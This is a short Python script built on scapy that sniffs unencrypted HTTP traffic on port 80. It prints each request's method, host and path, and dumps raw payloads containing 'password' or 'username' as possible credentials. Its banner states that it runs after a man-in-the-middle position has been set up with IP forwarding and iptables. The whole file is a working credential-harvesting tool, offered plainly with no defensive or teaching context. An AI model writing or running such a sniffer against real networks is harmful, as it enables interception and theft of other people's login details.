from scapy.all import sniff
from scapy.layers.http import HTTPRequest, HTTPResponse

def process_packet(pkt):
    if pkt.haslayer(HTTPRequest):
        http_layer = pkt[HTTPRequest]
        host = http_layer.Host.decode() if http_layer.Host else ""
        path = http_layer.Path.decode() if http_layer.Path else ""
        method = http_layer.Method.decode() if http_layer.Method else ""
        print(f"[HTTP] {method} http://{host}{path}")

        if pkt.haslayer("Raw"):
            raw = pkt["Raw"].load.decode(errors="ignore")
            if "password" in raw.lower() or "username" in raw.lower():
                print("[+] Possible credentials found:")
                print(raw)
                print("-" * 40)

def main():
    print("[+] Sniffing HTTP traffic (requires MITM + ip_forward/iptables)...")
    sniff(filter="tcp port 80", prn=process_packet, store=False)

if __name__ == "__main__":
    main()
